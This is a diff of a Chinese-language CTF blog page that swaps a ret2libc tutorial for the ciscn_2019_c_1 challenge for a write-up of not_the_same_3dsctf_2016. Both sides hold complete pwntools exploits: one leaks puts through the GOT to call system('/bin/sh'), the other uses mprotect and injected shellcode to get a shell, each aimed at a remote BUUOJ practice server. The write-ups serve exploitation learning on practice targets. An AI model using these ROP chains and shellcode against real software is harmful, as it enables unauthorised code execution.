@@ -6,7 +6,7 @@
 <meta HTTP-EQUIV="pragma" CONTENT="no-cache"> 
 <meta HTTP-EQUIV="Cache-Control" CONTENT="no-cache, must-revalidate"> 
 <meta HTTP-EQUIV="expires" CONTENT="0"> 
-<title>有关ret2libc利用方法的整理 | Winghr&#39;s Blog</title>	
+<title>not_the_same_3dsctf_2016_WP | Winghr&#39;s Blog</title>	
 
 <link rel="stylesheet" href="https://meowketer.github.io/styles/main.css">
 <script type="text/javascript">
@@ -142,10 +142,10 @@ window.onload=getCSS();
 	
 	                      
 		<div class="entry-content">
-			<h1 class="wow swing entry-title">有关ret2libc利用方法的整理</h1>
+			<h1 class="wow swing entry-title">not_the_same_3dsctf_2016_WP</h1>
 <div class="entry-meta">
 <div class="wow bounce">
-	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-03-26 21:33:13" itemprop="datePublished" pubdate="">2020-03-26</time></i>
+	<i class="iconfont icon-rili"> <time class="lately-a" datetime="2020-04-06 21:05:15" itemprop="datePublished" pubdate="">2020-04-06</time></i>
 	          </div>
 			
 </span>
@@ -153,84 +153,68 @@ window.onload=getCSS();
 		</div>
                   
 			<div class="wow slideInLeft entry-summary song">
-				<p>ret2libc是栈溢出漏洞利用的一种常见手段。这种漏洞利用方式结合了很多利用方法及系统机制，如ROP技术、linux延迟绑定机制等。本文结合近期练习的几道ret2libc漏洞CTF题目，归纳其利用的过程。</p>
-<h2 id="原理">原理</h2>
-<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置(即函数对应的 got表项的内容)。一般情况下，我们会选择执行 system(&quot;/bin/sh&quot;)，故而此时我们需要知道 system 函数的地址。首先先解释一下上面出现的一些名词。</p>
-<h3 id="libc是啥">libc是啥？</h3>
-<p>libc 是 Linux 下的 ANSI C 函数库。是C语言最基本的库函数。可以把它理解为可执行程序的运行依赖。</p>
-<h3 id="pltgot">PLT&amp;GOT</h3>
-<p>linux下的动态链接是通过PLT&amp;GOT来实现的，动态链接每个函数需要两个东西：<br>
-1、用来存放外部函数地址的数据段<br>
-2、用来获取数据段记录的外部函数地址的代码<br>
-对应有两个表，一个用来存放外部的函数地址的数据表称为全局偏移表（GOT, Global Offset Table），那个存放额外代码的表称为程序链接表（PLT，Procedure Link Table）<br>
-<img src="https://meowketer.github.io/post-images/1585232895786.jpeg" alt="" loading="lazy"><br>
-可执行文件里面保存的是 PLT 表的地址，对应 PLT 地址指向的是 GOT 的地址，GOT 表指向的就是 glibc 中的地址<br>
-那我们可以发现，在这里面想要通过 plt 表获取函数的地址，首先要保证 got 表已经获取了正确的地址，但是在一开始就进行所有函数的重定位是比较麻烦的，为此，linux 引入了延迟绑定机制</p>
-<h3 id="延迟绑定机制">延迟绑定机制</h3>
-<p>只有动态库函数在被调用时，才会地址解析和重定位工作。简单来讲，在一个binary运行的过程中，只有真正运行过的函数才真正被调用真实地址运行。当一个功能模块未被加载使用的时候，比如准备调用一个函数，会通过先在PLT表找到记录相对的GOT表项的内容，即可跳转真实地址运行调用函数。也就是所谓的地址解析和重定位。</p>
-<h2 id="一个实例">一个实例</h2>
-<p>在上面整理了相关的理论原理，通过下面的这道题目来对应实践上述内容。这个binary来自BUUOJ的ciscn_2019_c_1难度不大，刚刚好是re2libc的利用漏洞。<br>
-<img src="https://meowketer.github.io/post-images/1585234609391.png" alt="" loading="lazy"><br>
-程序根据不同的选项有不同的功能，载入ida中查看一下：<br>
-<img src="https://meowketer.github.io/post-images/1585234863292.png" alt="" loading="lazy"><br>
-可以看到在encrypt函数内存在栈溢出漏洞。对应程序的功能选项则为1选项。<br>
-<img src="https://meowketer.github.io/post-images/1585235183513.png" alt="" loading="lazy"><br>
-但是这里的算法会将我们输入的内容加密处理，这样我们构造payload时就无法直接实现我们攻击流程。所以第一步需要对这个算法进行处理。在这个算法中注意到strlen函数，这个函数的主要特性如下：strlen所作的是一个计数器的工作，它从内存的某个位置（可以是字符串开头，中间某个位置，甚至是某个不确定的内存区域）开始扫描，直到碰到第一个字符串结束符'\0'为止，然后返回计数器值(长度不包含'\0')。因此在这里我们只需要在payload开始的部分加入'\0'字符即可完成绕过。<br>
-还有一个需要注意的点就是，程序远程运行在乌班图18.04的环境下，因此在构造系统调用时需要使用ret先对齐。</p>
-<h2 id="利用思路">利用思路</h2>
-<p>1.在漏洞函数输入前，有这样一段内容puts(&quot;Input your Plaintext to be encrypted&quot;)；所以puts函数在我们输入前就已将运行完一遍了，因此可以尝试泄露这个函数的地址来获取目标系统中使用的libc版本。因此构造第一段payload,泄露这个puts函数的地址。payload如下：</p>
-<pre><code>payload = '\0' + (0x50-1 + 8)*'a' + p64(pop_rdi) + p64(puts_got)
-payload+= p64(puts_plt) + p64(main) 
-</code></pre>
-<p>首先就是用\0绕过加密算法，在补齐构造栈溢出的无用字符a，溢出后接ROP链再通过puts函数的plt表地址和got表地址泄露出puts真实的地址。最后在跳转回程序的开始，接第二段payload。</p>
-<p>2.完成泄露后，使用 LibcSearcher 模块link出来libc基地址，并进一步通过libc基地址加偏移的方法找到libc中的system地址及/bin/sh地址从而完成系统调用。代码如下：</p>
-<pre><code>libc = LibcSearcher('puts',puts)
-libc_addr=puts-libc.dump('puts')
-binsh=libc_addr+libc.dump('str_bin_sh')
-system=libc_addr+libc.dump('system')
-</code></pre>
-<p>3.构造第二次payload，这次为系统调用。将上一步骤中link出来的一些地址构造入payload中：</p>
-<pre><code>payload1 = '\0'+(0x50-1+8)* &quot;b&quot; + p64(ret_addr) + p64(pop_rdi) 
-payload1+= p64(binsh) + p64(system)
-</code></pre>
-<p>溢出后跳转到system（/bin/sh）从而完成系统调用，我想这里就不需要解释了。</p>
-<h2 id="完整exp">完整exp</h2>
-<pre><code> from pwn import * 
-from LibcSearcher import LibcSearcher
-context.os='linux'
-context.arch='amd64'
-context.log_level='debug'
-elf = ELF(&quot;./6&quot;)
-puts_plt = elf.plt[&quot;puts&quot;]
-puts_got = elf.got[&quot;puts&quot;]
-main = elf.symbols[&quot;main&quot;]
-pop_rdi = 0x400c83
-ret_addr = 0x4006b9
-def get64addr():
-    return u64(io.recvuntil('\n')[:-1].ljust(8,'\0'))
-#io = process('./6')
-io=remote('node3.buuoj.cn',29305)
-io.sendlineafter(&quot;choice!\n&quot;,&quot;1&quot;)
-payload = '\0' + (0x50-1 + 8)*'a' + p64(pop_rdi) + p64(puts_got)
-payload+= p64(puts_plt) + p64(main) 
-io.sendlineafter('encrypted\n',payload)
-io.recvline()
-io.recvline()
-puts = get64addr()
-print hex(puts)
-libc = LibcSearcher('puts',puts)
-libc_addr=puts-libc.dump('puts')
-binsh=libc_addr+libc.dump('str_bin_sh')
-system=libc_addr+libc.dump('system')
-io.sendlineafter('choice!\n','1')
-payload1 = '\0'+(0x50-1+8)* &quot;b&quot; + p64(ret_addr) + p64(pop_rdi) 
-payload1+= p64(binsh) + p64(system)
-io.sendlineafter('encrypted\n',payload1)
-io.interactive()
+				<h2 id="0x1程序的漏洞点">0x1程序的漏洞点</h2>
+<p><img src="https://meowketer.github.io/post-images/1586178472496.png" alt="" loading="lazy"><br>
+<img src="https://meowketer.github.io/post-images/1586178531796.png" alt="" loading="lazy"></p>
+<h2 id="0x2利用思路1">0x2利用思路1</h2>
+<p>图中可以直观的看到，有一个后门程序将flag输出到一段bss段上<br>
+可以采用程序已有的write函数，通过rop把flag打印出来。<br>
+exp<br>
+<img src="https://meowketer.github.io/post-images/1586178933606.png" alt="" loading="lazy"><br>
+其中溢出后首先接入的是利用部分的子程序起始，bss地址为&amp;fl4g的地址，之后便是write函数输出部分。<br>
+利用结果：<br>
+<img src="https://meowketer.github.io/post-images/1586179186351.png" alt="" loading="lazy"><br>
+能够按照预期正常输出flag，但是后半段内容大概未能完成堆栈平衡，所以出现了崩溃。</p>
+<h2 id="0x3第二种利用思路">0x3第二种利用思路</h2>
+<p>使用mprotect修改内存读写属性，之后写入shellcode取得控制权。<br>
+先贴一下exp:</p>
+<pre><code>```python
+#!/usr/bin/env python
+#coding=utf8 
 
+from pwn import *
+elf = ELF('./not')
+sh = remote('node3.buuoj.cn', 25336)
+pop3_ret = 0x08050b45 #ROPgedget --binary not -- only &quot;pop|ret&quot;
+
+mem_addr = 0x080eb000 #可读可写的内存,但不可执行 ,gdb,vmmap取 0x80ea000  0x80ec000 rw-p     2000 a1000 
+mem_size = 0x1000    #通过调试出来的值，上面取到的是中间部分也就是0x1000大小
+mem_proc = 0x7       #可代表可读可写可执行  7 = 4 + 2 +1 (rwx)
+
+mprotect_addr = elf.symbols['mprotect']
+read_addr = elf.symbols['read']
+
+'''
+为了连续在堆栈中执行,就是用pop3_ret来控制esp,使它往下弹掉已用的3个值.
+'''
+payload_01 = 'A' * 0x2d
+payload_01 += p32(mprotect_addr)
+payload_01 += p32(pop3_ret) #执行完mprotect的返回地址,使esp往下+12
+
+#mprotect 的三个参数
+payload_01 += p32(mem_addr)   #mprotect函数参数1 修改的内存地址
+payload_01 += p32(mem_size)   #mprotect函数参数2 修改的内存大小
+payload_01 += p32(mem_proc)   #mprotect函数参数3 修改的权限
+
+payload_01 += p32(read_addr) #执行完pop3_ret后弹到read地址
+
+payload_01 += p32(pop3_ret)  #执行完read后将返回到pop3_ret指令,又继续使esp+12
+
+#read 的三个参数
+payload_01 += p32(0)     #read函数参数1 ,从输入端读取
+payload_01 += p32(mem_addr)   #读取到的内容复制到指向的内存里
+payload_01 += p32(0x100) #读取大小
+
+payload_01 += p32(mem_addr)   #执行完read后ret esi
+
+sh.sendline(payload_01)
+payload_sh = asm(shellcraft.sh(),arch = 'i386', os = 'linux') 
+sh.sendline(payload_sh)
+sh.interactive()
+```
 </code></pre>
-<h1 id="总结">总结</h1>
-<p>通过示例程序我们可以直观的看到，ret2libc的利用过程，其中，包含了对PLT表及GOT表来完成地址泄露，并通过泄露的地址判断libc版本，从而进一步link出libc的基地址及与其相对偏移的系统调用参数地址。最终完成了系统调用。</p>
+<p>运行结果：<br>
+<img src="https://meowketer.github.io/post-images/1586180838311.png" alt="" loading="lazy"></p>
 
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
@@ -240,10 +224,10 @@ io.interactive()
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://meowketer.github.io/post/not_the_same_3dsctf_2016_wp/" rel="prev"> not_the_same_3dsctf_2016_WP</a></div>
+		<div class="wow bounceInLeft nav-previous3"><a href="https://meowketer.github.io/post/buu3/" rel="prev"> BUU-Pwn遇到的两道小坑</a></div>
 		 
 		 
-		<div class="wow bounceInRight nav-next3"><a href="https://meowketer.github.io/post/shellcode/" rel="next"> shellcode相关知识整理</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://meowketer.github.io/post/p=1/" rel="next"> 有关ret2libc利用方法的整理</a></div>
 		
 		</div>
 	</nav>
